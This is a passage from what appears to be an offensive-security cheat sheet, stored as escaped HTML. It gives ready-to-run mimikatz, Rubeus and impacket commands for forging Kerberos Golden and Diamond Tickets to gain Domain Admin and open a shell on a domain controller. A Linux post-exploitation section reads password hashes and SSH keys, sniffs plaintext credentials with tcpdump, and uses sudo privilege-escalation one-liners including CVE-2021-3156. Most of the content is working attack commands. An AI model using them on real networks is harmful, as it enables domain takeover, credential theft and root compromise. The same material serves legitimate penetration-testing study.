0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eA Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the \u003ccode\u003ekrbtgt\u003c/code\u003e account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The \u003ccode\u003ekrbtgt\u003c/code\u003e account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTaking advantage of a Golden Ticket is a form of overpass-the-hash, using the \u003ccode\u003ekrbtgt\u003c/code\u003e hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBefore starting, make sure you have the \u003ccode\u003ekrbtgt\u003c/code\u003e hash. You can get this many ways, including running \u003ccode\u003elsadump::lsa\u003c/code\u003e in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# extract the Domain SID from the user's SID\n# (remove the RID and keep the rest. RID is last set of numbers in SID)\nwhoami /user\n\n# in mimikatz shell\nprivilege::debug\n# remove all existing tickets, so they don't conflict with the one you're forging\nkerberos::purge\n# forge golden ticket, load into memory with /ptt\n# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver\n# use '/aes256:' for AES256 kerberos hash\nkerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt\n# start cmd shell with new ticket in its context\nmisc::cmd cmd\n\n# alternatively, use Rubeus (/aes256: if desired)\n.\\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]\n# here's loading a saved ticket:\n.\\Rubeus.exe ptt /ticket:ticket.kirbi\n\n# list tickets in memory, make sure its there\nklist\n\n# now use overpass-the-hash technique (full domain name required)\n.\\PsExec.exe \\\\dc1 cmd.exe\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e extract the Domain SID from the user's SID\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (remove the RID and keep the rest. RID is last set of numbers in SID)\u003c/span\u003e\nwhoami \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in mimikatz shell\u003c/span\u003e\nprivilege::debug\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e remove all existing tickets, so they don't conflict with the one you're forging\u003c/span\u003e\nkerberos::purge\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e forge golden ticket, load into memory with /ptt\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use '/aes256:' for AES256 kerberos hash\u003c/span\u003e\nkerberos::golden \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:USER \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain:DOMAIN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esid:S\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e21\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e...\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ekrbtgt:NTHASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start cmd shell with new ticket in its context\u003c/span\u003e\nmisc::cmd cmd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternatively, use Rubeus (/aes256: if desired)\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e golden \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003erc4:HASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:USERNAME \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eldap [\u003cspan class=\"pl-k\"\u003eoutfile\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003eFILENAME\u003c/span\u003e]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e here's loading a saved ticket:\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e ptt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eticket:ticket.kirbi\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list tickets in memory, make sure its there\u003c/span\u003e\nklist\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e now use overpass-the-hash technique (full domain name required)\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003ePsExec.exe\u003c/span\u003e \\\\dc1 \u003cspan class=\"pl-c1\"\u003ecmd.exe\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can forge a Golden Ticket on Kali:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# look up domain SID\nimpacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM\n\n# use -aesKey for AES256 hashes\nimpacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME\nexport KRB5CCNAME=$(pwd)/USERNAME.ccache\nimpacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM\n# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up domain SID\u003c/span\u003e\nimpacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use -aesKey for AES256 hashes\u003c/span\u003e\nimpacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e KRB5CCNAME=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003epwd\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e/USERNAME.ccache\nimpacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eEven better (more OPSEC savvy) is a \u003cem\u003eDiamond Ticket\u003c/em\u003e, where you modify the fields of a legitimate TGT by decrypting it with the \u003ccode\u003ekrbtgt\u003c/code\u003e hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Get user RID\nwhoami /user\n\n.\\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH\n# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.\n# /ticketuser is the username of the principal to impersonate.\n# /ticketuserid is the domain RID of that principal.\n# /groups are the desired group RIDs (512 being Domain Admins).\n# /krbkey is the krbtgt AES256 hash. \"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get user RID\u003c/span\u003e\nwhoami \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser\n\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e diamond \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etgtdeleg \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eticketuser:USERNAME \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eticketuserid:USER_RID \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003egroups:\u003cspan class=\"pl-c1\"\u003e512\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ekrbkey:AES256_HASH\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /ticketuser is the username of the principal to impersonate.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /ticketuserid is the domain RID of that principal.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /groups are the desired group RIDs (512 being Domain Admins).\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /krbkey is the krbtgt AES256 hash. \u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6 Linux\u003c/h1\u003e\u003ca id=\"user-content-6-linux\" class=\"anchor\" aria-label=\"Permalink: 6 Linux\" href=\"#6-linux\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.1 Basic Linux Post-Exploit Enumeration\u003c/h2\u003e\u003ca id=\"user-content-61-basic-linux-post-exploit-enumeration\" class=\"anchor\" aria-label=\"Permalink: 6.1 Basic Linux Post-Exploit Enumeration\" href=\"#61-basic-linux-post-exploit-enumeration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBefore you run basic enumeration, \u003ca href=\"#4.4.3%20Upgrading%20to%20Interactive%20Shell\"\u003eupgrade to an interactive shell\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# minimum commands\nid\nuname -a\ncat /etc/*release\nenv                # or 'set'\nps -ef wwf\nip a               # or ifconfig -a\nss -untap          # or 'netstat -untap'\nw\nlast\n\n\n###############################\n## SELF  ######################\n###############################\n\n# current user\nid\nwhoami\n\n# check sudo permissions\nsudo -l\n# take advantage of every permission you have!\n\n# environment\n(env || set) 2\u0026gt;/dev/null\n\n\n###############################\n## HOST  ######################\n###############################\n\n# hostname\nhostname\nhostname -A  # Linux - also shows all FQDNs\nhostname -f  # BSD,Mac - show FQDN\ncat /etc/hostname\n\n# OS Version info\n(cat /proc/version || uname -a ) 2\u0026gt;/dev/null\ncat /etc/*release\ncat /etc/issue\n# look for kernel version exploits\n\n\n###############################\n## USERS  #####################\n###############################\n\n# list all users, groups\ncat /etc/passwd\ncat /etc/group\ngrep -vE \u0026quot;nologin|false\u0026quot; /etc/passwd\ncat /etc/master.passwd\ncat /etc/shadow  # need to be root, get list of hashed passwords\n# pretty print relevant data\ngrep -v '#' /etc/passwd | awk -F: 'BEGIN{print \u0026quot;USERNAME PASSWD UID GID HOMEDIR SHELL\u0026quot;; print \u0026quot;-------- ------ --- --- ------- -----\u0026quot;} {print $1 \u0026quot; \u0026quot; $2 \u0026quot; \u0026quot; $3 \u0026quot; \u0026quot; $4 \u0026quot; \u0026quot; $6 \u0026quot; \u0026quot; $7}' | column -t\n\n# Currently signed in users\nw\nwho -a\n\n# Recently signed in users\nlast  # better info running as root, may need \u0026quot;-a\u0026quot; switch\n\n\n###############################\n## NETWORK  ###################\n###############################\n\n# IP addresses, interfaces\nip a\nifconfig -a\ncat /etc/network/interfaces\n# check that you're on the box you expect\n# look for pivots into other networks\n# look for signs of virtualization, containers, antivirus\n\n# Routing info\nip r\nroute -n\nroutel\nnetstat -r\n\n# arp table\nip n\narp -a\n\n# Network connections\n# when commands run as root, get process info for all users\n# when run as user, only see owned process information\nss -untap # Linux, all tcp/udp ports w/ pids\nnetstat -untap  # Old linux, all tcp/udp ports w/ pids\nnetstat -nvf inet # Mac\nlsof -Pni  # established connections\nfuser -n tcp PORTNUM # who is using port?\n# advanced, as root: data under /proc/net/\n\n# known hosts\ncat /etc/hosts\n\n# iptables rules\ncat /etc/iptables/rules.v4 # Debian,Ubuntu\ncat /etc/sysconfig/iptables # RHEL,CentOS,Fedora\ncat /etc/iptables/rules.v6 # Debian,Ubuntu\ncat /etc/sysconfig/ip6tables # RHEL,CentOS,Fedora\n# must be root to run 'iptables'\niptables -L -v -n\niptables -t nat -L -v -n  # NAT info\niptables-save  # saved iptables\n\n# DNS resolver info\ncat /etc/resolv.conf\n\n# if you have sudo permissions for tcpdump,\n# privesc with it (it's a GTFOBin).\n# Also, sniff for plaintext creds:\nsudo tcpdump -i lo -A | grep -i \u0026quot;pass\u0026quot;\n\n\n###############################\n## PROCESSES  #################\n###############################\n\n# running processes\nps -ef wwf\n# look for unusual processes\n# or processes running as root that shouldn't be\n\n# view all cron scripts\nls -lah /etc/cron*\n# look at system-wide crontab\ncat /etc/crontab\n# pay attention to PATH in /etc/crontab and any bad file perms of scripts\n\n# check this user's cron jobs\ncrontab -l\n\n# check for running cron jobs\ngrep \u0026quot;CRON\u0026quot; /var/log/syslog\ngrep \u0026quot;CRON\u0026quot; /var/log/cron.log\n\n# list every user's cron jobs\nfor user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2\u0026gt;/dev/null\n\n\n###############################\n## FILESYSTEM  ################\n###############################\n\n# mounted filesystems\nmount\ncat /etc/fstab\ncat /etc/auto?master\ndf -h # disk stats\nlsblk # available disks\n# unmounted partitions may have juicy files on them\n# look for credentials in /etc/fstab or /etc/auto*\n\n# find all SUID and SGID binaries\nfind / -type f \\( -perm -u+s -o -perm -g+s \\) -executable -ls 2\u0026gt; /dev/null\nfind / -type f \\( -perm -u+s -o -perm -g+s \\) -perm -o+x -ls 2\u0026gt; /dev/null\n\n# list writable directories in PATH\n# bash, sh:\n( set -o noglob; IFS=:;for p in $PATH; do [ -w \u0026quot;$p\u0026quot; ] \u0026amp;\u0026amp; ls -ald $p; done )\n# zsh:\n( set -o noglob; IFS=:; for p in ($(echo $PATH)); do [ -w \u0026quot;$p\u0026quot; ] \u0026amp;\u0026amp; ls -ald $p; done )\n\n# find world-writable files and directories\nfind / \\( -path /sys -o -path /proc -o -path /dev \\) -prune -o -perm -o+w -type d -ls 2\u0026gt;/dev/null\nfind / \\( -path /sys -o -path /proc -o -path /dev \\) -prune -o -perm -o+w -type f -ls 2\u0026gt;/dev/null\n# to limit search to current file system mount, use -mount or -xdev\n\n# find directories/files _this user_ can write to, not owned by me\nfind / \\( -path /sys -o -path /proc \\) -prune -o -writable -type d -not -user \u0026quot;$(whoami)\u0026quot; -ls 2\u0026gt;/dev/null\nfind / \\( -path /sys -o -path /proc \\) -prune -o -perm -o+w -type d -not -user \u0026quot;$(whoami)\u0026quot; -ls 2\u0026gt;/dev/null\nfind / \\( -path /sys -o -path /proc \\) -prune -o -writable -type f -not -user \u0026quot;$(whoami)\u0026quot; -ls 2\u0026gt;/dev/null\n\n# check Capabilities of files\n# look for GTFOBins that have cap_setuid+ep (effective, permitted)\n/usr/sbin/getcap -r / 2\u0026gt;/dev/null | grep cap_setuid\n\n# shell history\ncat /home/*/.*history\ngrep -E 'telnet|ssh|mysql' /home/*/.*history 2\u0026gt;/dev/null\n\n# credential files\nls -l /home/*/.ssh/id_*  # ssh keys\nls -AlR /home/*/.gnupg  # PGP keys\nls -l /tmp/krb5*  # Kerberos tickets\nfind / -type f -name *.gpg\nfind / -type f -name id_*\n\n\n\n###############################\n## SOFTWARE  ##################\n###############################\n\n# Info on installed packages\ndpkg -l  # Debian\nrpm -qa --last  # RedHat\nyum list | grep installed  # CentOS/RedHat w/ Yum\napt list --installed  # Debain w/ Apt\npkg_info  # xBSD\npkginfo  # Solaris\nls -d /var/db/pkg/  # Gentoo\npacman -Q  # Arch\ncat /etc/apt/sources.list  # Apt sources\nls -l /etc/yum.repos.d/  # Yum repos\ncat /etc/yum.conf  # Yum config\n\n# Kernel modules\nlsmod # list loaded modules\n/sbin/modinfo MODULENAME # get info on module\n\n# check version info of useful binaries\ngcc -v  # compiler\nldd --version  # glibc version\npython --version\npython3 --version\nperl -v\nphp -v\nruby -v\nnode -v\nmysql --version\n\n# See if other useful GTFO-bins are present\nwhich awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip\n\n\n##################################\n## VULNERABILITIES  ##############\n##################################\n\n# check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)\n# *check only works if you are in sudoers file. Affects all legacy versions\n# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.\n# Exploit works even if user isn't in sudoers file.\nsudoedit -s /\n# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'\n# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git\n\n# check sudo version\nsudo -V\n# if older than 1.8.28, root privesc:\nsudo -u#-1 /bin/bash\n# or sudo -u \\#$((0xffffffff)) /bin/bash\n\n\n# check for pwnkit (look for version \u0026lt; 0.120)\n/usr/bin/pkexec --version\n\n\n####################################\n## MISCELLANEOUS  ##################\n####################################\n\n# kernel system messages since boot\ndmesg\n\n# processor and memory info\ncat /proc/cpuinfo\ncat /proc/meminfo\n\n# Message of the Day\ncat /etc/motd\n\n# Get SELinux status\ngetenforce\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e minimum commands\u003c/span\u003e\nid\nuname -a\ncat /etc/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003erelease\nenv                \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or 'set'\u003c/span\u003e\nps -ef wwf\nip a               \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or ifconfig -a\u003c/span\u003e\nss -untap          \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or 'netstat -untap'\u003c/span\u003e\nw\nlast\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# SELF  ######################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e current user\u003c/span\u003e\nid\nwhoami\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check sudo permissions\u003c/span\u003e\nsudo -l\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e take advantage of every permission you have!\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e environment\u003c/span\u003e\n(env \u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e set) \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# HOST  ######################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hostname\u003c/span\u003e\nhostname\nhostname -A  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Linux - also shows all FQDNs\u003c/span\u003e\nhostname -f  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e BSD,Mac - show FQDN\u003c/span\u003e\ncat /etc/hostname\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e OS Version info\u003c/span\u003e\n(cat /proc/version \u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e uname -a ) \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\ncat /etc/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003erelease\ncat /etc/issue\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for kernel version exploits\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# USERS  #####################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all users, groups\u003c/span\u003e\ncat /etc/passwd\ncat /etc/group\ngrep -vE \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enologin|false\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e /etc/passwd\ncat /etc/master.passwd\ncat /etc/shadow  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e need to be root, get list of hashed passwords\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e pretty print relevant data\u003c/span\u003e\ngrep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e#\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e /etc/passwd \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e awk -F: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eBEGIN{print \"USERNAME PASSWD UID GID HOMEDIR SHELL\"; print \"-------- ------ --- --- ------- -----\"} {print $1 \" \" $2 \" \" $3 \" \" $4 \" \" $6 \" \" $7}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e column -t\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Currently signed in users\u003c/span\u003e\nw\nwho -a\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Recently signed in users\u003c/span\u003e\nlast  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e better info running as root, may need \"-a\" switch\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# NETWORK  ###################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e IP addresses, interfaces\u003c/span\u003e\nip a\nifconfig -a\ncat /etc/network/interfaces\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check that you're on the box you expect\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for pivots into other networks\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for signs of virtualization, containers, antivirus\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Routing info\u003c/span\u003e\nip r\nroute -n\nroutel\nnetstat -r\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e arp table\u003c/span\u003e\nip n\narp -a\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Network connections\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e when commands run as root, get process info for all users\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e when run as user, only see owned process information\u003c/span\u003e\nss -untap \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Linux, all tcp/udp ports w/ pids\u003c/span\u003e\nnetstat -untap  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Old linux, all tcp/udp ports w/ pids\u003c/span\u003e\nnetstat -nvf inet \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 